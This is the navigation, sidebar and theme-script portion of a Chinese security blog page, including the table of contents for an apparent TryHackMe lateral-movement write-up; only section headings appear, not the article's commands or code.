href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 通过网络移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%AA%E5%90%91%E8%BF%90%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text">什么是横向运动？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">一个简单的例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E8%A7%86%E8%A7%92"><span class="toc-number">2.3.</span> <span class="toc-text">攻击者的视角</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8Cuac"><span class="toc-number">2.4.</span> <span class="toc-text">管理员和UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E8%BF%9C%E7%A8%8B%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">0x03 远程生成过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec-%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text">Psexec 执行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-winrm-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">使用 WinRM 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sc-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text">使用 sc 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.4.</span> <span class="toc-text">远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">3.5.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E4%BD%BF%E7%94%A8-wmi-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.</span> <span class="toc-text">0x04 使用 WMI 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-powershell-%E8%BF%9E%E6%8E%A5%E5%88%B0-wmi"><span class="toc-number">4.1.</span> <span class="toc-text">从 Powershell 连接到 WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">使用 WMI 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.3.</span> <span class="toc-text">使用 WMI 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.4.</span> <span class="toc-text">使用 WMI 远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmi-%E9%80%9A%E8%BF%87-wmi-%E5%AE%89%E8%A3%85-msi-%E5%8C%85"><span class="toc-number">4.5.</span> <span class="toc-text">WMI 通过 WMI 安装 MSI 包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">4.6.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E4%BD%BF%E7%94%A8%E6%9B%BF%E4%BB%A3%E8%AE%A4%E8%AF%81%E6%9D%90%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">0x05 使用替代认证材料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm%E8%AE%A4%E8%AF%81"><span class="toc-number">5.1.</span> <span class="toc-text">NTLM认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.</span> <span class="toc-text">传递哈希值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%9C%AC%E5%9C%B0-sam-%E4%B8%AD%E6%8F%90%E5%8F%96-ntlm-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.1.</span> <span class="toc-text">从本地 SAM 中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E-lsass-%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96-ntlm-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.2.</span> <span class="toc-text">从 LSASS 内存中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-linux-%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C"><span class="toc-number">5.2.3.</span> <span class="toc-text">使用 Linux 传递哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.</span> <span class="toc-text">Kerberos 身份验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%A5%A8"><span class="toc-number">5.4.</span> <span class="toc-text">传票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E8%B6%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E5%AF%86%E9%92%A5"><span class="toc-number">5.5.</span> <span class="toc-text">跨越哈希&#x2F;传递密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">5.6.</span> <span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-hash"><span class="toc-number">5.6.1.</span> <span class="toc-text">Pass-the-Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-ticket"><span class="toc-number">5.6.2.</span> <span class="toc-text">Pass-the-Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-key"><span class="toc-number">5.6.3.</span> <span class="toc-text">Pass-the-Key</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%BB%A5%E7%94%A8%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA"><span class="toc-number">6.</span> <span class="toc-text">0x06 滥用用户行为</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8F%AF%E5%86%99%E8%82%A1%E4%BB%BD"><span class="toc-number">6.1.</span> <span class="toc-text">滥用可写股份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-vbs-%E8%84%9A%E6%9C%AC"><span class="toc-number">6.1.1.</span> <span class="toc-text">后门 .vbs 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe-%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">.exe 文件后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp%E5%8A%AB%E6%8C%81"><span class="toc-number">6.1.3.</span> <span class="toc-text">RDP劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">6.2.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.</span> <span class="toc-text">0x07 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E9%9A%A7%E9%81%93"><span class="toc-number">7.1.</span> <span class="toc-text">SSH 隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.2.</span> <span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.3.</span> <span class="toc-text">SSH 本地端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-socat-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.4.</span> <span class="toc-text">使用 socat 进行端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C-socks"><span class="toc-number">7.5.</span> <span class="toc-text">动态端口转发和 SOCKS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">7.6.</span> <span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%A4%8D%E6%9D%82%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.</span> <span class="toc-text">隧道复杂漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

